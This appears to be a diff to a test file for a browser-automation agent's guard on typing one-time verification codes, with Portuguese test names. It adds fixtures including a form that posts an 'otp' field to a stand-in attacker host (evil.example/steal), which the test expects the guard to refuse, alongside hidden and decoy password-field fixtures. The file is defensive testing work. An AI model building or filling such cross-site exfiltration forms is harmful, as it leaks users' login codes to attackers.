@@ -160,6 +160,9 @@ const FIXTURES = {
 	"/hidden-visibility": page(`<form><input type="password" id="p" style="visibility:hidden"></form>`),
 	"/hidden-clipped": page(`<form><div style="width:0;height:0;overflow:hidden"><input type="password" id="p" style="width:200px;height:30px"></div></form>`),
 	"/hidden-attr": page(`<form><input type="password" id="p" hidden></form>`),
+	"/code-step": page(`<form action="/verify"><input type="text" name="verification_code" id="c" autocomplete="one-time-code"><button>Verificar</button></form>`),
+	"/code-in-search": page(`<form action="/s"><input type="text" name="q" id="c"></form>`),
+	"/code-cross-action": page(`<form action="https://evil.example/steal"><input type="text" name="otp" id="c"></form>`),
 	// Isca oculta primeiro, campo de verdade depois: preenche o de verdade.
 	"/decoy-first": page(`<form action="/s"><input type="password" id="decoy" style="display:none"><input type="password" id="p"></form>`),
 };
@@ -278,5 +281,25 @@ test("submit com origem igual envia o formulário (Enter) com o campo preenchido
 		await actions.browserType({ selector: PASSWORD_SELECTOR, text: "segredo", submit: true, guard: guard("password") });
 		assert.equal(await p.evaluate(() => window.__enter), 1);
 		await assert.rejects(actions.browserType({ selector: "#p", text: "x", guard: { kind: "totp" } }), /guard inválido/);
+	});
+});
+
+test("código de verificação (B3): só em campo de código visível de formulário da própria origem", async () => {
+	const CODE_SELECTOR = 'input[autocomplete="one-time-code"], input[name*="code" i], input[name*="otp" i], input[inputmode="numeric"]';
+	await withPage("/code-step", async (p, actions) => {
+		await actions.browserType({ selector: CODE_SELECTOR, text: "482913", guard: guard("code") });
+		assert.equal(await valueOf(p, "#c"), "482913");
+	});
+	await withPage("/code-in-search", async (p, actions) => {
+		await assert.rejects(actions.browserType({ selector: "#c", text: "482913", guard: guard("code") }), /Recusado: o código só pode/);
+		assert.equal(await valueOf(p, "#c"), "");
+	});
+	await withPage("/code-cross-action", async (p, actions) => {
+		await assert.rejects(actions.browserType({ selector: CODE_SELECTOR, text: "482913", guard: guard("code") }), /envia os dados para outro site/);
+		assert.equal(await valueOf(p, "#c"), "");
+	});
+	await withPage("/one-screen", async (p, actions) => {
+		await assert.rejects(actions.browserType({ selector: PASSWORD_SELECTOR, text: "482913", guard: guard("code") }), /Recusado: o código só pode|Não achei/);
+		assert.equal(await valueOf(p, "#p"), "");
 	});
 });
